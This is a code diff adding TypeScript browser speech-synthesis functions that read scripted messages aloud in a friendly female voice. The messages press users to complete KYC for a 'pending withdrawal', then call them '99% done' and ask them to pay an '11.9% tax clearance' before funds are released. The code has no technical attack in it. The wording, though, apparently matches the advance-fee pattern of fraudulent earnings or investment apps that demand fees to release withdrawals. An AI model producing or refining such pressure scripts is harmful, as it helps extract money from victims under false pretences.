@@ -353,3 +353,147 @@ class VoiceGuideManager {
 }
 
 export const voiceGuide = new VoiceGuideManager();
+
+// --------------------------------------------------------------------
+// DEDICATED FEMALE VOICE ADVISOR FOR KYC & TAX CLEARANCE
+// --------------------------------------------------------------------
+
+export const KYC_PENDING_SPEECH_TEXT =
+  "Hello! You have a pending withdrawal waiting for payout. Please complete your KYC verification so your withdrawal can be credited directly to your bank account. Without completing your KYC verification, your first withdrawal cannot be delivered. Please complete your KYC now.";
+
+export const TAX_CLEARANCE_SPEECH_TEXT =
+  "Congratulations on completing your KYC verification! You are now 99% done with your first withdrawal. Please complete your statutory 11.9% tax clearance so your funds can be disbursed directly to your bank account.";
+
+/**
+ * Finds the most natural female English voice available on the device
+ */
+function getPreferredFemaleVoice(): SpeechSynthesisVoice | null {
+  if (typeof window === 'undefined' || !('speechSynthesis' in window)) return null;
+  const voices = window.speechSynthesis.getVoices();
+  if (!voices || voices.length === 0) return null;
+
+  // 1. Look for explicit female voices in English
+  const preferred = voices.find((v) => {
+    const name = (v.name || '').toLowerCase();
+    const isEn = (v.lang || '').toLowerCase().startsWith('en');
+    return (
+      isEn &&
+      (name.includes('female') ||
+        name.includes('kore') ||
+        name.includes('zira') ||
+        name.includes('samantha') ||
+        name.includes('victoria') ||
+        name.includes('karen') ||
+        name.includes('serena') ||
+        name.includes('natural') ||
+        name.includes('google uk english female') ||
+        name.includes('ava') ||
+        name.includes('allison') ||
+        name.includes('moira'))
+    );
+  });
+  if (preferred) return preferred;
+
+  // 2. Fallback to any English voice
+  return voices.find((v) => (v.lang || '').toLowerCase().startsWith('en')) || voices[0] || null;
+}
+
+/**
+ * Plays a clear female voice advising the user to complete KYC for their pending withdrawal
+ */
+export function speakKycPendingAdvice(onStart?: () => void, onEnd?: () => void): boolean {
+  if (typeof window === 'undefined' || !('speechSynthesis' in window)) return false;
+
+  try {
+    window.speechSynthesis.cancel();
+
+    const utterance = new SpeechSynthesisUtterance(KYC_PENDING_SPEECH_TEXT);
+    utterance.rate = 0.94;
+    utterance.pitch = 1.08;
+    utterance.volume = 1.0;
+
+    const voice = getPreferredFemaleVoice();
+    if (voice) {
+      utterance.voice = voice;
+    } else {
+      window.speechSynthesis.onvoiceschanged = () => {
+        const v = getPreferredFemaleVoice();
+        if (v) utterance.voice = v;
+      };
+    }
+
+    utterance.onstart = () => {
+      if (onStart) onStart();
+    };
+
+    utterance.onend = () => {
+      if (onEnd) onEnd();
+    };
+
+    utterance.onerror = () => {
+      if (onEnd) onEnd();
+    };
+
+    window.speechSynthesis.speak(utterance);
+    return true;
+  } catch (err) {
+    console.warn('KYC voice advice error:', err);
+    return false;
+  }
+}
+
+/**
+ * Plays a clear female voice advising the user to complete statutory tax clearance (99% stage)
+ */
+export function speakTaxClearanceAdvice(onStart?: () => void, onEnd?: () => void): boolean {
+  if (typeof window === 'undefined' || !('speechSynthesis' in window)) return false;
+
+  try {
+    window.speechSynthesis.cancel();
+
+    const utterance = new SpeechSynthesisUtterance(TAX_CLEARANCE_SPEECH_TEXT);
+    utterance.rate = 0.94;
+    utterance.pitch = 1.08;
+    utterance.volume = 1.0;
+
+    const voice = getPreferredFemaleVoice();
+    if (voice) {
+      utterance.voice = voice;
+    } else {
+      window.speechSynthesis.onvoiceschanged = () => {
+        const v = getPreferredFemaleVoice();
+        if (v) utterance.voice = v;
+      };
+    }
+
+    utterance.onstart = () => {
+      if (onStart) onStart();
+    };
+
+    utterance.onend = () => {
+      if (onEnd) onEnd();
+    };
+
+    utterance.onerror = () => {
+      if (onEnd) onEnd();
+    };
+
+    window.speechSynthesis.speak(utterance);
+    return true;
+  } catch (err) {
+    console.warn('Tax clearance voice advice error:', err);
+    return false;
+  }
+}
+
+/**
+ * Stops any active speech synthesis advice immediately
+ */
+export function stopAllVoiceAdvice(): void {
+  if (typeof window !== 'undefined' && 'speechSynthesis' in window) {
+    try {
+      window.speechSynthesis.cancel();
+    } catch {}
+  }
+}
+
